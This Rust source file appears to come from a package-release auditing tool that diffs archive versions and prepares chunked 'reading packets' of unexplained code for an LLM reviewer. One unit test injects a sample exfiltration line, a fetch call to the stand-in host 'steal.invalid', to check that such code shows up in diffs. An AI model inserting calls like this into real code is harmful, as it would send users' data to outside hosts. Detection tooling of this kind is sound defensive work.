use crate::archive::{LoadedArchive, strip_archive_root};
use crate::canonical::canonical_id;
use crate::model::{
    BreakKind, ClassTotal, FileRole, OriginClass, ReachToken, ResidualDiff, TransitionLedger,
};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum StepKind {
    New,
    Patch,
    Minor,
    Major,
    Other,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PacketHeader {
    pub name: String,
    pub from_version: Option<String>,
    pub to_version: String,
    pub step_kind: StepKind,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct StatedChange {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub changelog_diff: Option<String>,
    pub commit_subjects: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PacketFacts {
    pub totals: BTreeMap<OriginClass, ClassTotal>,
    pub breaks: BTreeSet<BreakKind>,
    pub flags: BTreeSet<BreakKind>,
    pub new_reach: BTreeSet<ReachToken>,
    pub new_hostnames: BTreeSet<String>,
    pub unexplained_code_bytes: u64,
    pub unexplained_non_exec_bytes: u64,
    pub skipped_non_exec_files: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ReadingUnit {
    pub unit_id: String,
    pub path: String,
    pub is_new_file: bool,
    pub is_minified_split: bool,
    pub chunk_index: usize,
    pub chunk_total: usize,
    pub unread: bool,
    pub line_count: usize,
    /// Raw lines indexed 0..line_count (corresponding to 1-based line numbers 1..=line_count).
    pub lines: Vec<String>,
}

impl ReadingUnit {
    /// Formats this unit with 1-based line numbers for LLM prompts.
    pub fn numbered_text(&self) -> String {
        let mut out = String::new();
        for (i, line) in self.lines.iter().enumerate() {
            out.push_str(&format!("{:>5} | {line}\n", i + 1));
        }
        out
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ReadingPacket {
    pub schema: u32,
    pub header: PacketHeader,
    pub stated_change: StatedChange,
    pub facts: PacketFacts,
    pub units: Vec<ReadingUnit>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub source_diff: Option<String>,
    pub packet_hash: String,
}

#[derive(Debug, Clone, Copy)]
pub struct PacketBudgets {
    pub per_call_budget_bytes: usize,
    pub overlap_lines: usize,
    pub hard_cap_bytes: usize,
}

impl Default for PacketBudgets {
    fn default() -> Self {
        Self {
            per_call_budget_bytes: 24_000,
            overlap_lines: 10,
            hard_cap_bytes: 256_000,
        }
    }
}

/// Deterministically builds a `ReadingPacket` from a `TransitionLedger` and its verified archives.
pub fn build_reading_packet(
    ledger: &TransitionLedger,
    ref_archive: Option<&LoadedArchive>,
    new_archive: &LoadedArchive,
    commit_subjects: Vec<String>,
    source_diff: Option<String>,
    budgets: PacketBudgets,
) -> Result<ReadingPacket, String> {
    let from_version = ledger.reference.as_ref().map(|r| r.version.clone());
    let step_kind = classify_step(from_version.as_deref(), &ledger.new.version);
    let changelog_diff = extract_changelog_diff(ref_archive, new_archive);

    let mut units = Vec::new();
    let mut skipped_non_exec_files = Vec::new();
    let mut unit_seq: usize = 0;

    let new_manifest = crate::archive::extract_manifest_facts(new_archive);
    let mut declared_exec_rel_paths: std::collections::BTreeSet<String> =
        std::collections::BTreeSet::new();
    for p in new_manifest
        .bin_paths
        .iter()
        .chain(new_manifest.entry_paths.iter())
    {
        declared_exec_rel_paths.insert(p.trim_start_matches("./").to_ascii_lowercase());
    }

    for f in &ledger.files {
        if f.class != OriginClass::Unexplained {
            continue;
        }
        let rel_lower = crate::archive::strip_archive_root(&f.path).to_ascii_lowercase();
        let is_declared_exec = declared_exec_rel_paths.contains(&rel_lower);
        if !is_declared_exec
            && matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc)
        {
            skipped_non_exec_files.push(format!("{} ({} B)", sanitize_unit_path(&f.path), f.bytes));
            continue;
        }

        let Some(new_bytes) = new_archive.contents.get(&f.path) else {
            continue;
        };
        let safe_path = sanitize_unit_path(&f.path);
        let Ok(new_text) = std::str::from_utf8(new_bytes) else {
            // Non-UTF8 unexplained binary file -> cannot be safely read as text; mark unread.
            unit_seq += 1;
            units.push(ReadingUnit {
                unit_id: format!("u{unit_seq}:{safe_path}"),
                path: safe_path,
                is_new_file: ref_archive
                    .map(|r| !r.contents.contains_key(&f.path))
                    .unwrap_or(true),
                is_minified_split: false,
                chunk_index: 1,
                chunk_total: 1,
                unread: true,
                line_count: 0,
                lines: Vec::new(),
            });
            continue;
        };

        let ref_text = ref_archive
            .and_then(|r| r.contents.get(&f.path))
            .and_then(|b| std::str::from_utf8(b).ok());

        let is_new_file = ref_text.is_none();
        let (new_lines, new_split) = split_if_minified(new_text);

        let mut raw_unit_lines: Vec<String> = match ref_text {
            Some(rt) => {
                let (ref_lines, _ref_split) = split_if_minified(rt);
                unified_diff_lines(&ref_lines, &new_lines, 3)
            }
            None => new_lines.iter().map(|l| format!("+{l}")).collect(),
        };

        // Fail closed if minified splitting normalized away whitespace/semicolon diffs on a changed file:
        // fall back to raw line diff so unexplained changed bytes are never silently dropped!
        if raw_unit_lines.is_empty() {
            let fallback_new: Vec<String> = new_text.lines().map(String::from).collect();
            raw_unit_lines = match ref_text {
                Some(rt) => {
                    let fallback_ref: Vec<String> = rt.lines().map(String::from).collect();
                    unified_diff_lines(&fallback_ref, &fallback_new, 3)
                }
                None => fallback_new.iter().map(|l| format!("+{l}")).collect(),
            };
        }
        if raw_unit_lines.is_empty() && !new_bytes.is_empty() {
            unit_seq += 1;
            units.push(ReadingUnit {
                unit_id: format!("u{unit_seq}:{safe_path}"),
                path: safe_path,
                is_new_file,
                is_minified_split: new_split,
                chunk_index: 1,
                chunk_total: 1,
                unread: true,
                line_count: 0,
                lines: Vec::new(),
            });
            continue;
        }

        let total_bytes: usize = raw_unit_lines.iter().map(|l| l.len() + 1).sum();
        if total_bytes > budgets.hard_cap_bytes {
            unit_seq += 1;
            units.push(ReadingUnit {
                unit_id: format!("u{unit_seq}:{safe_path}"),
                path: safe_path,
                is_new_file,
                is_minified_split: new_split,
                chunk_index: 1,
                chunk_total: 1,
                unread: true,
                line_count: 0,
                lines: Vec::new(),
            });
            continue;
        }

        let chunks = chunk_lines(&raw_unit_lines, budgets.per_call_budget_bytes, budgets.overlap_lines);
        let chunk_total = chunks.len().max(1);
        for (idx, chunk) in chunks.into_iter().enumerate() {
            unit_seq += 1;
            let unit_id = if chunk_total == 1 {
                format!("u{unit_seq}:{safe_path}")
            } else {
                format!("u{unit_seq}:{safe_path}#{}/{}", idx + 1, chunk_total)
            };
            let line_count = chunk.len();
            units.push(ReadingUnit {
                unit_id,
                path: safe_path.clone(),
                is_new_file,
                is_minified_split: new_split,
                chunk_index: idx + 1,
                chunk_total,
                unread: false,
                line_count,
                lines: chunk,
            });
        }
    }

    // If a reading was triggered by flags or new reach with ZERO unexplained executable files,
    // include the changed non-carried executable/manifest files so the reader NEVER receives an empty packet!
    if units.is_empty() && (!ledger.flags.is_empty() || !ledger.new_reach.is_empty()) {
        for f in &ledger.files {
            let rel_lower = crate::archive::strip_archive_root(&f.path).to_ascii_lowercase();
            let is_declared_exec = declared_exec_rel_paths.contains(&rel_lower);
            if f.class == OriginClass::Carried
                || (!is_declared_exec
                    && matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc))
            {
                continue;
            }
            let Some(new_bytes) = new_archive.contents.get(&f.path) else {
                continue;
            };
            let Ok(new_text) = std::str::from_utf8(new_bytes) else {
                continue;
            };
            let safe_path = sanitize_unit_path(&f.path);
            let ref_text = ref_archive
                .and_then(|r| r.contents.get(&f.path))
                .and_then(|b| std::str::from_utf8(b).ok());
            let (new_lines, new_split) = split_if_minified(new_text);
            let raw_unit_lines: Vec<String> = match ref_text {
                Some(rt) => {
                    let (ref_lines, _) = split_if_minified(rt);
                    unified_diff_lines(&ref_lines, &new_lines, 3)
                }
                None => new_lines.iter().map(|l| format!("+{l}")).collect(),
            };
            if raw_unit_lines.is_empty() {
                continue;
            }
            let chunks = chunk_lines(
                &raw_unit_lines,
                budgets.per_call_budget_bytes,
                budgets.overlap_lines,
            );
            let chunk_total = chunks.len().max(1);
            for (idx, chunk) in chunks.into_iter().enumerate() {
                unit_seq += 1;
                let unit_id = if chunk_total == 1 {
                    format!("u{unit_seq}:{safe_path}")
                } else {
                    format!("u{unit_seq}:{safe_path}#{}/{}", idx + 1, chunk_total)
                };
                let line_count = chunk.len();
                units.push(ReadingUnit {
                    unit_id,
                    path: safe_path.clone(),
                    is_new_file: ref_text.is_none(),
                    is_minified_split: new_split,
                    chunk_index: idx + 1,
                    chunk_total,
                    unread: false,
                    line_count,
                    lines: chunk,
                });
            }
        }
    }

    let mut packet = ReadingPacket {
        schema: 1,
        header: PacketHeader {
            name: ledger.name.clone(),
            from_version,
            to_version: ledger.new.version.clone(),
            step_kind,
        },
        stated_change: StatedChange {
            changelog_diff,
            commit_subjects,
        },
        facts: PacketFacts {
            totals: ledger.totals.clone(),
            breaks: ledger.breaks.clone(),
            flags: ledger.flags.clone(),
            new_reach: ledger.new_reach.clone(),
            new_hostnames: ledger.new_hostnames.clone(),
            unexplained_code_bytes: ledger.unexplained_code_bytes,
            unexplained_non_exec_bytes: ledger.unexplained_non_exec_bytes,
            skipped_non_exec_files,
        },
        units,
        source_diff,
        packet_hash: String::new(),
    };

    packet.packet_hash = canonical_id(&packet)?;
    Ok(packet)
}

/// Strips control characters and newlines from untrusted archive paths before embedding in prompts.
fn sanitize_unit_path(path: &str) -> String {
    path.chars()
        .map(|c| if c.is_control() { '_' } else { c })
        .collect()
}

/// Builds compact inline unified diff previews for unexplained executable/manifest files
/// so reviewers and coding agents can immediately see the leftover lines without hunting tarballs.
pub fn build_inline_residual_diffs(
    ledger: &TransitionLedger,
    ref_archive: Option<&LoadedArchive>,
    new_archive: &LoadedArchive,
    max_files: usize,
    max_lines_per_file: usize,
) -> Vec<ResidualDiff> {
    let mut out = Vec::new();
    for f in &ledger.files {
        if out.len() >= max_files {
            break;
        }
        if f.class != OriginClass::Unexplained
            || matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc)
        {
            continue;
        }
        let Some(new_bytes) = new_archive.contents.get(&f.path) else {
            continue;
        };
        let Ok(new_text) = std::str::from_utf8(new_bytes) else {
            out.push(ResidualDiff {
                path: f.path.clone(),
                bytes: f.bytes,
                total_lines: 0,
                truncated: true,
                diff: format!("[binary file, {} bytes]", f.bytes),
            });
            continue;
        };
        let ref_text = ref_archive
            .and_then(|r| r.contents.get(&f.path))
            .and_then(|b| std::str::from_utf8(b).ok());
        let (new_lines, _) = split_if_minified(new_text);
        let diff_lines = match ref_text {
            Some(rt) => {
                let (ref_lines, _) = split_if_minified(rt);
                unified_diff_lines(&ref_lines, &new_lines, 2)
            }
            None => new_lines.iter().map(|l| format!("+{l}")).collect(),
        };
        let total_lines = diff_lines.len();
        let truncated = total_lines > max_lines_per_file;
        let shown: Vec<&str> = diff_lines
            .iter()
            .take(max_lines_per_file)
            .map(|s| s.as_str())
            .collect();
        out.push(ResidualDiff {
            path: f.path.clone(),
            bytes: f.bytes,
            total_lines,
            truncated,
            diff: shown.join("\n"),
        });
    }
    out
}

/// Returns a copy of `packet` with units reversed (used for independent `readings = 2` verification).
pub fn reverse_packet_units(packet: &ReadingPacket) -> Result<ReadingPacket, String> {
    let mut cloned = packet.clone();
    cloned.units.reverse();
    cloned.packet_hash.clear();
    cloned.packet_hash = canonical_id(&cloned)?;
    Ok(cloned)
}

/// Deterministically splits minified long lines (> 400 chars) on `;`, `{`, `}`, or 200-char boundaries
/// so unified diffs and line-range citations remain compact and verifiable.
pub fn split_if_minified(text: &str) -> (Vec<String>, bool) {
    let needs_split = text.lines().any(|l| l.len() > 400);
    if !needs_split {
        return (text.lines().map(String::from).collect(), false);
    }

    let mut out = Vec::new();
    for line in text.lines() {
        if line.len() <= 400 {
            out.push(line.to_string());
            continue;
        }
        let mut cur = String::new();
        let mut in_quote: Option<char> = None;
        let mut escaped = false;
        for ch in line.chars() {
            cur.push(ch);
            if escaped {
                escaped = false;
                continue;
            }
            if ch == '\\' && in_quote.is_some() {
                escaped = true;
                continue;
            }
            if let Some(q) = in_quote {
                if ch == q {
                    in_quote = None;
                }
            } else if ch == '\'' || ch == '"' || ch == '`' {
                in_quote = Some(ch);
            } else if (ch == ';' || ch == '{' || ch == '}') && cur.len() >= 40 {
                out.push(std::mem::take(&mut cur));
                continue;
            }
            if cur.len() >= 200 {
                out.push(std::mem::take(&mut cur));
            }
        }
        if !cur.is_empty() {
            out.push(cur);
        }
    }
    (out, true)
}

/// Pure-Rust line-based unified diff with `context` lines around changes.
/// Uses exact prefix/suffix stripping + LCS on bounded changed cores, falling back to
/// chunked line comparison for massive files so it never blows memory or CPU.
pub fn unified_diff_lines(old: &[String], new: &[String], context: usize) -> Vec<String> {
    // Strip identical prefix and suffix first (fast O(N) common case for bundled patches!).
    let mut prefix = 0usize;
    let min_len = old.len().min(new.len());
    while prefix < min_len && old[prefix] == new[prefix] {
        prefix += 1;
    }
    let mut suffix = 0usize;
    while suffix < (old.len() - prefix).min(new.len() - prefix)
        && old[old.len() - 1 - suffix] == new[new.len() - 1 - suffix]
    {
        suffix += 1;
    }

    if prefix == old.len() && prefix == new.len() {
        return Vec::new();
    }

    let old_mid = &old[prefix..old.len() - suffix];
    let new_mid = &new[prefix..new.len() - suffix];

    let mut ops: Vec<(char, usize, usize, String)> = Vec::new();
    // Add leading context from prefix
    let ctx_start = prefix.saturating_sub(context);
    for idx in ctx_start..prefix {
        ops.push((' ', idx + 1, idx + 1, old[idx].clone()));
    }

    // Use exact DP LCS if mid product <= 2_500_000 (~10 MB max), else clean replacement hunk.
    if old_mid.len().saturating_mul(new_mid.len()) <= 2_500_000 {
        let mid_ops = lcs_diff(old_mid, new_mid, prefix, prefix);
        ops.extend(mid_ops);
    } else {
        for (i, line) in old_mid.iter().enumerate() {
            ops.push(('-', prefix + i + 1, prefix + 1, line.clone()));
        }
        for (j, line) in new_mid.iter().enumerate() {
            ops.push(('+', old.len() - suffix + 1, prefix + j + 1, line.clone()));
        }
    }

    // Add trailing context from suffix
    let trail = suffix.min(context);
    for k in 0..trail {
        let oi = old.len() - suffix + k;
        let ni = new.len() - suffix + k;
        ops.push((' ', oi + 1, ni + 1, old[oi].clone()));
    }

    // Collapse long unchanged runs inside `ops` into compact unified hunks.
    collapse_to_hunks(&ops, context)
}

fn lcs_diff(
    a: &[String],
    b: &[String],
    a_base: usize,
    b_base: usize,
) -> Vec<(char, usize, usize, String)> {
    let n = a.len();
    let m = b.len();
    let stride = m + 1;
    let mut dp = vec![0u32; (n + 1) * stride];
    for i in (0..n).rev() {
        for j in (0..m).rev() {
            dp[i * stride + j] = if a[i] == b[j] {
                dp[(i + 1) * stride + (j + 1)] + 1
            } else {
                dp[(i + 1) * stride + j].max(dp[i * stride + (j + 1)])
            };
        }
    }

    let mut ops = Vec::new();
    let (mut i, mut j) = (0usize, 0usize);
    while i < n && j < m {
        if a[i] == b[j] {
            ops.push((' ', a_base + i + 1, b_base + j + 1, a[i].clone()));
            i += 1;
            j += 1;
        } else if dp[(i + 1) * stride + j] >= dp[i * stride + (j + 1)] {
            ops.push(('-', a_base + i + 1, b_base + j + 1, a[i].clone()));
            i += 1;
        } else {
            ops.push(('+', a_base + i + 1, b_base + j + 1, b[j].clone()));
            j += 1;
        }
    }
    while i < n {
        ops.push(('-', a_base + i + 1, b_base + j + 1, a[i].clone()));
        i += 1;
    }
    while j < m {
        ops.push(('+', a_base + i + 1, b_base + j + 1, b[j].clone()));
        j += 1;
    }
    ops
}

fn collapse_to_hunks(ops: &[(char, usize, usize, String)], context: usize) -> Vec<String> {
    let mut keep = vec![false; ops.len()];
    for (idx, (tag, _, _, _)) in ops.iter().enumerate() {
        if *tag != ' ' {
            let start = idx.saturating_sub(context);
            let end = (idx + context + 1).min(ops.len());
            for k in start..end {
                keep[k] = true;
            }
        }
    }

    let mut out = Vec::new();
    let mut i = 0;
    while i < ops.len() {
        if !keep[i] {
            i += 1;
            continue;
        }
        let start = i;
        while i < ops.len() && keep[i] {
            i += 1;
        }
        let end = i;
        let old_start = ops[start].1;
        let new_start = ops[start].2;
        let old_count = ops[start..end].iter().filter(|o| o.0 != '+').count();
        let new_count = ops[start..end].iter().filter(|o| o.0 != '-').count();
        out.push(format!(
            "@@ -{old_start},{old_count} +{new_start},{new_count} @@"
        ));
        for (tag, _, _, line) in &ops[start..end] {
            out.push(format!("{tag}{line}"));
        }
    }
    out
}

fn chunk_lines(lines: &[String], budget_bytes: usize, overlap: usize) -> Vec<Vec<String>> {
    if lines.is_empty() {
        return vec![Vec::new()];
    }
    let total: usize = lines.iter().map(|l| l.len() + 1).sum();
    if total <= budget_bytes {
        return vec![lines.to_vec()];
    }

    let mut chunks = Vec::new();
    let mut start = 0usize;
    while start < lines.len() {
        let mut end = start;
        let mut bytes = 0usize;
        while end < lines.len() {
            let line_bytes = lines[end].len() + 1;
            if end > start && bytes + line_bytes > budget_bytes {
                break;
            }
            bytes += line_bytes;
            end += 1;
        }
        chunks.push(lines[start..end].to_vec());
        if end >= lines.len() {
            break;
        }
        let next_start = end.saturating_sub(overlap);
        start = if next_start <= start { end } else { next_start };
    }
    chunks
}

fn extract_changelog_diff(
    ref_archive: Option<&LoadedArchive>,
    new_archive: &LoadedArchive,
) -> Option<String> {
    let (path, new_bytes) = new_archive.contents.iter().find(|(p, _)| {
        let lower = strip_archive_root(p).to_ascii_lowercase();
        lower.starts_with("changelog")
            || lower.starts_with("history")
            || lower.starts_with("changes")
    })?;
    let new_text = std::str::from_utf8(new_bytes).ok()?;
    let new_lines: Vec<String> = new_text.lines().take(300).map(String::from).collect();
    let ref_lines: Vec<String> = ref_archive
        .and_then(|r| r.contents.get(path))
        .and_then(|b| std::str::from_utf8(b).ok())
        .map(|t| t.lines().take(300).map(String::from).collect())
        .unwrap_or_default();

    let diff = unified_diff_lines(&ref_lines, &new_lines, 1);
    if diff.is_empty() {
        None
    } else {
        let joined = diff.into_iter().take(60).collect::<Vec<_>>().join("\n");
        Some(joined)
    }
}

fn classify_step(from: Option<&str>, to: &str) -> StepKind {
    let Some(f) = from else {
        return StepKind::New;
    };
    let parse = |s: &str| -> Option<(u64, u64, u64)> {
        let core = s.split(['-', '+']).next()?;
        let mut parts = core.split('.');
        Some((
            parts.next()?.parse().ok()?,
            parts.next()?.parse().ok()?,
            parts.next()?.parse().ok()?,
        ))
    };
    match (parse(f), parse(to)) {
        (Some((ma1, mi1, pa1)), Some((ma2, mi2, pa2))) => {
            if ma2 != ma1 {
                StepKind::Major
            } else if mi2 != mi1 {
                StepKind::Minor
            } else if pa2 != pa1 {
                StepKind::Patch
            } else {
                StepKind::Other
            }
        }
        _ => StepKind::Other,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn splits_minified_single_line_and_diffs_compactly() {
        let mut base = String::new();
        for i in 0..30 {
            base.push_str(&format!("function f{i}(x){{return x+{i};}}"));
        }
        let mut head = base.clone();
        head.push_str("function evil(){fetch('https://steal.invalid');}");

        let (old_l, split_o) = split_if_minified(&base);
        let (new_l, split_n) = split_if_minified(&head);
        assert!(split_o && split_n);
        assert!(old_l.len() > 5);

        let diff = unified_diff_lines(&old_l, &new_l, 2);
        let joined = diff.join("\n");
        assert!(joined.contains("steal.invalid"));
        assert!(diff.len() < 12);
    }

    #[test]
    fn chunks_large_units_with_overlap() {
        let lines: Vec<String> = (0..100).map(|i| format!("+const line_{i} = 'hello world';")).collect();
        let chunks = chunk_lines(&lines, 600, 3);
        assert!(chunks.len() > 2);
        // Overlap preserved between chunk 0 and chunk 1
        let tail = chunks[0].last().unwrap();
        assert!(chunks[1].iter().any(|l| l == tail));
    }
}
